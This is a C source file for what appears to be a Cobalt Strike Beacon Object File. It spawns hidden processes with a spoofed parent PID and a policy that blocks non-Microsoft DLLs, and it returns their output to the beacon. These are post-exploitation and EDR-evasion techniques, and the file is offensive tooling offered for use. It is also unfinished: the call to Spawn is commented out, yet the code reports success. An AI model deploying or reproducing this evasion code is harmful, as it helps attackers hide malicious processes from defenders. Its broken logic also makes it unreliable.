#include <windows.h>
#include <winnt.h>

#include <beacon.h>
#include <win32.h>

#define RUN      "run"
#define PPID     "ppid"
#define ARGUE    "argue"
#define BLOCKDLL "blockdlls"

void go(_In_ char* args, _In_ int argc)
{
    datap Parser     = { 0 };
    
    PSTR Handle      = NULL;

    BOOL Result      = FALSE;

    PSTR  Command     = NULL;
    DWORD CommandLen  = 0x00;

    PSTR  TargetProc  = NULL;
    DWORD TargetLen   = 0x00;

    PSTR  CurDir      = NULL;
    DWORD CurDirLen   = 0x00;

    DWORD       PPid    = 0x00;
    const PCHAR PPidKey = "ppidkeyvalue";

    BOOL        BlockDlls    = FALSE;
    const PCHAR BlockDllsKey = "blockdllskeyvalue";

    BeaconDataParse( &Parser, args, argc );
    
    Handle = BeaconDataExtract( &Parser, NULL );

    if ( StringCompareA( Handle, PPID ) == 0 ) 
    {
        BeaconRemoveValue( PPidKey );
        PPid = BeaconDataInt( &Parser );
        BeaconAddValue( PPidKey, &PPid );
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PPid set to %d\n", PPid);
    }
    else if ( StringCompareA( Handle, BLOCKDLL ) == 0 )
    {
        BeaconRemoveValue( BlockDllsKey );
        BlockDlls = BeaconDataShort( &Parser );
        
    } 
    else if ( StringCompareA( Handle, RUN ) == 0 ) 
    {
        Command    = BeaconDataExtract(&Parser, &CommandLen);
        //PPid       = (DWORD)BeaconGetValue( PPidKey );
        //BlockDlls  = BeaconDataInt(&Parser);

        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[+] Parsed Args:\n"
            "   - Command Line: %ls\n"
            "   - PPid: %d\n"
            "   - BlockDlls: %d\n",
            Command, PPid, BlockDlls
        );
        /*
        if ( !Spawn( Command, 696, BlockDlls, NULL, NULL ) ) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Spawn execution failed!");
            return;
        }
        */
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawn execution succeeded!");
    } 
    else 
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Unknown handle command: %s\n", Handle);
    }

    return;
}

BOOL Spawn(
    _In_      PSTR   Command,
    _In_      DWORD  PPid,
    _In_      BOOL   BlockDlls,
    _Out_opt_ HANDLE *hProc,
    _Out_opt_ HANDLE *hThr
)
{
    PROCESS_INFORMATION ProcessInfo     = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOEXA      StartUpInfoA    = { 0 };
    SIZE_T              AttrSize        = 0x00;
    PVOID               AttrBuf         = NULL;
    DWORD64             BlockPolicy     = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    HANDLE  hStdOutPipeRead  = NULL;    
    HANDLE  hStdOutPipeWrite = NULL;

    if ( KERNEL32$CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE ) {
        BeaconPrintf(CALLBACK_ERROR, "[X] CreatePipe for stdout failed 0x%X.", KERNEL32$GetLastError()); return FALSE;
    }

    MemZero( &StartUpInfoA, sizeof(STARTUPINFOEXA) );
    MemZero( &ProcessInfo, sizeof(PROCESS_INFORMATION) );

    StartUpInfoA.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    StartUpInfoA.StartupInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | EXTENDED_STARTUPINFO_PRESENT;
    StartUpInfoA.StartupInfo.wShowWindow = SW_HIDE;
    StartUpInfoA.StartupInfo.hStdError   = hStdOutPipeWrite;
    StartUpInfoA.StartupInfo.hStdOutput  = hStdOutPipeWrite;
    StartUpInfoA.StartupInfo.hStdInput   = NULL;

    KERNEL32$InitializeProcThreadAttributeList( NULL, 2, NULL, &AttrSize ); // Agora temos dois atributos possíveis
    AttrBuf = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, AttrSize );

    if ( !KERNEL32$InitializeProcThreadAttributeList( AttrBuf, 2, NULL, &AttrSize ) ){
        BeaconPrintf(CALLBACK_ERROR, "[X] Initialize proc attr list failed with error 0x%X\n", KERNEL32$GetLastError()); return FALSE;
    }

    if ( BlockDlls ) {
        if ( !KERNEL32$UpdateProcThreadAttribute( AttrBuf, NULL, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &BlockPolicy, sizeof(DWORD64), NULL, NULL ) ){
            BeaconPrintf(CALLBACK_ERROR, "[X] Update proc attr failed with error 0x%X\n", KERNEL32$GetLastError()); return FALSE;
        }
    }

    if ( PPid != 0x00 ) {
        HANDLE hParentProcess = KERNEL32$OpenProcess( PROCESS_CREATE_PROCESS, FALSE, PPid );
        
        if ( hParentProcess == NULL ) {
            BeaconPrintf(CALLBACK_ERROR, "[X] Open parent process failed with error 0x%X\n", KERNEL32$GetLastError()); return FALSE;
        }

        if ( !KERNEL32$UpdateProcThreadAttribute( AttrBuf, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL ) ){
            BeaconPrintf(CALLBACK_ERROR, "[X] Update parent process attr failed with error 0x%X\n", KERNEL32$GetLastError()); return FALSE;
        }

        KERNEL32$CloseHandle(hParentProcess);
    }

    StartUpInfoA.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)AttrBuf;

    if ( KERNEL32$CreateProcessA( NULL, Command, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE ) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Create process failed with error 0x%X\n", KERNEL32$GetLastError()); return FALSE;
    }

    KERNEL32$DeleteProcThreadAttributeList( AttrBuf );
    KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, AttrBuf );

    KERNEL32$CloseHandle( hStdOutPipeWrite );

    UCHAR* pOutputBuffer = NULL;
    UCHAR  buf[1024 + 1] = { 0 };
    DWORD  dwBufferSize  = 0x00;
    DWORD  dwRead        = 0x00;
    BOOL   SuccessFul    = FALSE;

    pOutputBuffer = (UCHAR*)KERNEL32$LocalAlloc( LPTR, sizeof(UCHAR) );

    do {
        SuccessFul = KERNEL32$ReadFile( hStdOutPipeRead, buf, 1024, &dwRead, NULL );

        if (dwRead == 0) {
            break;
        }

        pOutputBuffer = (UCHAR*)KERNEL32$LocalReAlloc( pOutputBuffer, dwBufferSize + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

        MemCopy( pOutputBuffer + dwBufferSize, buf, dwRead );
        dwBufferSize += dwRead;
        MemSet( buf, 0, sizeof(buf) );

    } while (SuccessFul == TRUE);

    if (pOutputBuffer != NULL) {
        BeaconOutput( CALLBACK_OUTPUT, pOutputBuffer, dwBufferSize );        
        KERNEL32$LocalFree( pOutputBuffer );
    }

    KERNEL32$CloseHandle( hStdOutPipeRead );

    return TRUE;
}

SIZE_T StringLengthW(_In_ LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

INT StringCompareA(_In_ LPCSTR String1, _In_ LPCSTR String2)
{
	for (; *String1 == *String2; String1++, String2++)
	{
		if (*String1 == '\0')
			return 0;
	}

	return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
}

void InitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer)
{
    if ((UsStruct->Buffer = (PWSTR)Buffer))
    {
        unsigned int Length = StringLengthW(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc)
            Length = 0xfffc;

        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }
    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

VOID MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size)
{
	PULONG Dest = (PULONG)Destination;
	SIZE_T Count = Size / sizeof(ULONG);

	while (Count > 0)
	{
		*Dest = 0;
		Dest++;
		Count--;
	}

	return;
}

PVOID MemSet(void* Destination, int Value, size_t Size)
{
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}